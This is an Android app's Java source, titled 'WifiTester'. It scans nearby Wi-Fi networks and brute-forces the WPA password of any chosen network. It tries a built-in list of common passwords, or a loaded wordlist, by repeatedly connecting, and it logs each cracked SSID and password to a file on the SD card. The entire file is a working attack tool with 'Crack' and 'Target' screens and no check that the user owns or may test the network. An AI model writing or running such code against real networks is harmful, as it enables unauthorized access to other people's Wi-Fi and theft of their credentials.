package com.ollie.wifitester;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.*;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.*;
import android.text.TextUtils;
import android.util.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.graphics.Typeface;
import java.io.*;
import java.util.*;

public class MainActivity extends Activity {
    private static final int REQ_DOC = 1001;
    private static final String FOUND = "/mnt/sdcard/wifi/found.txt";

    private WifiManager wifi;
    private LinearLayout root;
    private TextView title;
    private FrameLayout content;
    private LinearLayout panelScan, panelCrack, panelResults;
    private Button btnScan, btnCrack, btnResults;
    private ListView listScan, listResults;
    private ArrayAdapter<String> scanAdapter, resultAdapter;
    private ArrayList<String> scanList = new ArrayList<>();
    private ArrayList<ScanResult> scanResults = new ArrayList<>();
    private String selectedTarget = null;

    // crack panel widgets
    private Spinner spnTarget;
    private Button btnLoadWl, btnStart, btnStop;
    private TextView tvWl, tvCount, tvLog;
    private ProgressBar progress;
    private ArrayAdapter<String> targetAdapter;
    private ArrayList<String> targets = new ArrayList<>();
    private List<String> wordlist = new ArrayList<>(Arrays.asList(
        "12345678","password","123456789","qwerty","admin","wifi1234","internet","letmein","welcome",
        "00000000","11111111","87654321","admin123","password123","root","guest","test1234","1234567890",
        "qwertyuiop","iloveyou","monkey123","dragon123","sunshine1","princess1","football1","baseball1",
        "passw0rd","p@ssw0rd","hello123","charlie1","donald123","trustno1","1q2w3e4r","zaq1xsw2",
        "123qweasd","qazwsxedc","1234abcd","abcd1234","wlan","router","modem","default","user"
    ));
    private volatile boolean stop = false;
    private volatile boolean running = false;
    private int foundCount = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        wifi = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
        root = new LinearLayout(this); root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF0a0a0a);
        title = new TextView(this);
        title.setText("WifiTester"); title.setTextColor(0xFF00ff41);
        title.setTextSize(20); title.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams lpTitle = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lpTitle.setMargins(16, 12, 16, 8); title.setLayoutParams(lpTitle);
        root.addView(title);

        LinearLayout bar = new LinearLayout(this); bar.setOrientation(LinearLayout.HORIZONTAL);
        bar.setBackgroundColor(0xFF121212);
        btnScan = mkBtn("Scan"); btnCrack = mkBtn("Crack"); btnResults = mkBtn("Results");
        bar.addView(btnScan); bar.addView(btnCrack); bar.addView(btnResults);
        LinearLayout.LayoutParams lpBar = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 48);
        bar.setLayoutParams(lpBar); root.addView(bar);

        content = new FrameLayout(this);
        LinearLayout.LayoutParams lpContent = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT, 1);
        content.setLayoutParams(lpContent); root.addView(content);

        buildScan(); buildCrack(); buildResults();
        showScan();

        btnScan.setOnClickListener(v -> { showScan(); scan(); });
        btnCrack.setOnClickListener(v -> showCrack());
        btnResults.setOnClickListener(v -> { showResults(); loadResults(); });

        setContentView(root);
        scan();
    }

    private Button mkBtn(String t) {
        Button b = new Button(this); b.setText(t); b.setTextSize(13);
        b.setTextColor(0xFF000000); b.setBackgroundColor(0xFF00ff41);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1);
        lp.setMargins(6, 6, 6, 6); b.setLayoutParams(lp);
        return b;
    }

    private void buildScan() {
        panelScan = new LinearLayout(this); panelScan.setOrientation(LinearLayout.VERTICAL);
        panelScan.setPadding(12, 12, 12, 12);
        Button refresh = new Button(this); refresh.setText("Refresh"); refresh.setTextSize(13);
        refresh.setTextColor(0xFF000000); refresh.setBackgroundColor(0xFF7c3aed);
        LinearLayout.LayoutParams lpr = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, 40);
        panelScan.addView(refresh, lpr);
        listScan = new ListView(this);
        scanAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, scanList);
        listScan.setAdapter(scanAdapter);
        listScan.setOnItemClickListener((p, v, pos, id) -> {
            ScanResult s = scanResults.get(pos);
            selectedTarget = s.SSID;
            targets.clear(); targets.add(s.SSID);
            targetAdapter.notifyDataSetChanged();
            spnTarget.setSelection(0);
            Toast.makeText(this, "Target: " + s.SSID, Toast.LENGTH_SHORT).show();
            showCrack();
        });
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
        panelScan.addView(listScan, lp);
        content.addView(panelScan);
        refresh.setOnClickListener(v -> scan());
    }

    private void buildCrack() {
        panelCrack = new LinearLayout(this); panelCrack.setOrientation(LinearLayout.VERTICAL);
        panelCrack.setPadding(12, 10, 12, 10);
        ScrollView sv = new ScrollView(this);
        LinearLayout inner = new LinearLayout(this); inner.setOrientation(LinearLayout.VERTICAL);
        inner.setPadding(0, 0, 0, 6);

        TextView th = new TextView(this); th.setText("Crack"); th.setTextColor(0xFF00ff41); th.setTextSize(20); th.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams lpTh = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT); lpTh.setMargins(0,0,0,10); th.setLayoutParams(lpTh);
        inner.addView(th);

        spnTarget = new Spinner(this);
        targetAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, targets);
        targetAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spnTarget.setAdapter(targetAdapter);
        LinearLayout.LayoutParams lpSp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 48); lpSp.setMargins(0,0,0,10); spnTarget.setLayoutParams(lpSp);
        inner.addView(spnTarget);

        LinearLayout row = new LinearLayout(this); row.setOrientation(LinearLayout.HORIZONTAL);
        btnLoadWl = new Button(this); btnLoadWl.setText("Load Wordlist"); btnLoadWl.setTextSize(12);
        btnLoadWl.setTextColor(0xFF000000); btnLoadWl.setBackgroundColor(0xFF7c3aed);
        tvWl = new TextView(this); tvWl.setText("default (" + wordlist.size() + ")"); tvWl.setTextColor(0xFF94a3b8); tvWl.setTextSize(12);
        tvWl.setGravity(Gravity.CENTER_VERTICAL);
        LinearLayout.LayoutParams lpLoad = new LinearLayout.LayoutParams(0, 44, 1); lpLoad.setMargins(0,0,8,10); btnLoadWl.setLayoutParams(lpLoad);
        LinearLayout.LayoutParams lpWl = new LinearLayout.LayoutParams(0, 44, 2); lpWl.setMargins(0,0,0,10); tvWl.setLayoutParams(lpWl);
        row.addView(btnLoadWl); row.addView(tvWl); inner.addView(row);

        LinearLayout row2 = new LinearLayout(this); row2.setOrientation(LinearLayout.HORIZONTAL);
        btnStart = new Button(this); btnStart.setText("Start Crack"); btnStart.setTextSize(14);
        btnStart.setTextColor(0xFF000000); btnStart.setBackgroundColor(0xFF00ff41);
        btnStop = new Button(this); btnStop.setText("Stop"); btnStop.setTextSize(14);
        btnStop.setTextColor(0xFF000000); btnStop.setBackgroundColor(0xFFef4444);
        LinearLayout.LayoutParams lpS = new LinearLayout.LayoutParams(0, 48, 1); lpS.setMargins(0,0,6,10); btnStart.setLayoutParams(lpS);
        LinearLayout.LayoutParams lpSt = new LinearLayout.LayoutParams(0, 48, 1); lpSt.setMargins(6,0,0,10); btnStop.setLayoutParams(lpSt);
        row2.addView(btnStart); row2.addView(btnStop); inner.addView(row2);

        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        LinearLayout.LayoutParams lpProg = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 6); lpProg.setMargins(0,0,0,10); progress.setLayoutParams(lpProg);
        inner.addView(progress);

        tvCount = new TextView(this); tvCount.setText("Cracked: 0"); tvCount.setTextColor(0xFF94a3b8); tvCount.setTextSize(13);
        LinearLayout.LayoutParams lpC = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT); lpC.setMargins(0,0,0,10); tvCount.setLayoutParams(lpC);
        inner.addView(tvCount);

        tvLog = new TextView(this); tvLog.setTextColor(0xFF00ff41); tvLog.setTextSize(12); tvLog.setTypeface(Typeface.MONOSPACE);
        tvLog.setBackgroundColor(0xFF1a1a1a); tvLog.setPadding(8,8,8,8);
        tvLog.setMovementMethod(android.text.method.ScrollingMovementMethod.getInstance());
        LinearLayout.LayoutParams lpLog = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 260); lpLog.setMargins(0,0,0,0); tvLog.setLayoutParams(lpLog);
        inner.addView(tvLog);

        sv.addView(inner);
        panelCrack.addView(sv);
        content.addView(panelCrack);

        btnLoadWl.setOnClickListener(v -> pickDoc());
        btnStart.setOnClickListener(v -> startCrack());
        btnStop.setOnClickListener(v -> { stop = true; tvLog.append("stopping...\n"); });
    }

    private void buildResults() {
        panelResults = new LinearLayout(this); panelResults.setOrientation(LinearLayout.VERTICAL);
        panelResults.setPadding(12, 12, 12, 12);
        TextView th = new TextView(this); th.setText("Results"); th.setTextColor(0xFF00ff41); th.setTextSize(20); th.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams lpTh = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT); lpTh.setMargins(0,0,0,10); th.setLayoutParams(lpTh);
        panelResults.addView(th);
        listResults = new ListView(this);
        resultAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, new ArrayList<>());
        listResults.setAdapter(resultAdapter);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);
        panelResults.addView(listResults, lp);
        content.addView(panelResults);
    }

    private void show(LinearLayout p) {
        panelScan.setVisibility(p == panelScan ? View.VISIBLE : View.GONE);
        panelCrack.setVisibility(p == panelCrack ? View.VISIBLE : View.GONE);
        panelResults.setVisibility(p == panelResults ? View.VISIBLE : View.GONE);
        if (p == panelScan) title.setText("Scan"); else if (p == panelCrack) title.setText("Crack"); else title.setText("Results");
        btnScan.setBackgroundColor(p == panelScan ? 0xFF00ff41 : 0xFF1a1a1a);
        btnCrack.setBackgroundColor(p == panelCrack ? 0xFF00ff41 : 0xFF1a1a1a);
        btnResults.setBackgroundColor(p == panelResults ? 0xFF00ff41 : 0xFF1a1a1a);
    }
    private void showScan() { show(panelScan); }
    private void showCrack() { show(panelCrack); refreshTargets(); }
    private void showResults() { show(panelResults); }

    private void refreshTargets() {
        targets.clear();
        if (selectedTarget != null) targets.add(selectedTarget);
        targets.addAll(scanList);
        // dedupe preserving order
        LinkedHashSet<String> set = new LinkedHashSet<>(targets); targets.clear(); targets.addAll(set);
        targetAdapter.notifyDataSetChanged();
        if (!targets.isEmpty()) spnTarget.setSelection(0);
    }

    private void scan() {
        scanList.clear(); scanResults.clear();
        scanAdapter.notifyDataSetChanged();
        tvLogCrack("scanning...");
        boolean started = wifi.startScan();
        new Handler(Looper.getMainLooper()).postDelayed(this::doScan, 3000);
    }

    private void doScan() {
        List<ScanResult> list = wifi.getScanResults();
        scanResults.clear(); scanList.clear();
        if (list != null) for (ScanResult s : list) {
            scanResults.add(s);
            scanList.add(s.SSID + "  " + s.level + "dBm  " + s.capabilities);
        }
        scanAdapter.notifyDataSetChanged();
        refreshTargets();
        tvLogCrack("found " + scanList.size() + " networks");
    }

    private void pickDoc() {
        Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        i.addCategory(Intent.CATEGORY_OPENABLE);
        i.setType("text/*");
        startActivityForResult(i, REQ_DOC);
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_DOC && res == RESULT_OK && data != null && data.getData() != null) {
            Uri uri = data.getData();
            try {
                InputStream is = getContentResolver().openInputStream(uri);
                BufferedReader br = new BufferedReader(new InputStreamReader(is));
                List<String> wl = new ArrayList<>();
                String line;
                while ((line = br.readLine()) != null) { line = line.trim(); if (!line.isEmpty()) wl.add(line); }
                br.close(); is.close();
                wordlist = wl;
                tvWl.setText("loaded (" + wordlist.size() + ")");
                tvLogCrack("loaded " + wordlist.size() + " passwords");
            } catch (Exception e) {
                tvLogCrack("load failed: " + e.getMessage());
            }
        }
    }

    private void startCrack() {
        if (running) return;
        if (targets.isEmpty()) { tvLogCrack("no target"); return; }
        String target = spnTarget.getSelectedItem().toString();
        running = true; stop = false; foundCount = 0;
        btnStart.setEnabled(false); btnStop.setEnabled(true);
        progress.setMax(wordlist.size()); progress.setProgress(0);
        tvCount.setText("Cracked: 0");
        tvLogCrack("target: " + target);
        new Thread(() -> {
            int idx = 0;
            for (String pw : wordlist) {
                if (stop) { ui(() -> tvLogCrack("stopped")); break; }
                idx++;
                final int pi = idx;
                ui(() -> progress.setProgress(pi));
                if (tryConnect(target, pw)) {
                    ui(() -> {
                        tvLogCrack("FOUND: " + target + " -> " + pw);
                        foundCount++; tvCount.setText("Cracked: " + foundCount);
                        save(target, pw);
                    });
                    break;
                }
            }
            if (!stop && !running) { }
            ui(() -> { running = false; btnStart.setEnabled(true); btnStop.setEnabled(false); });
            if (!stop) ui(() -> tvLogCrack("not cracked"));
        }).start();
    }

    private boolean tryConnect(String ssid, String pw) {
        try {
            WifiConfiguration wc = new WifiConfiguration();
            wc.SSID = "\"" + ssid + "\"";
            wc.preSharedKey = "\"" + pw + "\"";
            wc.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
            int netId = wifi.addNetwork(wc);
            if (netId < 0) return false;
            wifi.disconnect();
            wifi.enableNetwork(netId, true);
            wifi.reassociate();
            Thread.sleep(2500);
            WifiInfo info = wifi.getConnectionInfo();
            if (info != null) {
                String connected = info.getSSID();
                if (connected != null && connected.replace("\"", "").equals(ssid)) return true;
            }
        } catch (Exception e) { ui(() -> tvLogCrack("err: " + e.getMessage())); }
        return false;
    }

    private void save(String ssid, String pw) {
        try {
            File f = new File(FOUND);
            f.getParentFile().mkdirs();
            FileWriter fw = new FileWriter(f, true);
            fw.write(ssid + ":" + pw + "\n"); fw.close();
        } catch (Exception e) {}
    }

    private void loadResults() {
        List<String> rows = new ArrayList<>();
        try {
            BufferedReader br = new BufferedReader(new FileReader(FOUND));
            String line;
            while ((line = br.readLine()) != null) rows.add(line);
            br.close();
        } catch (Exception e) {}
        resultAdapter.clear(); resultAdapter.addAll(rows);
    }

    private void tvLogCrack(final String m) { ui(() -> tvLog.append(m + "\n")); }
    private void ui(Runnable r) { new Handler(Looper.getMainLooper()).post(r); }
}
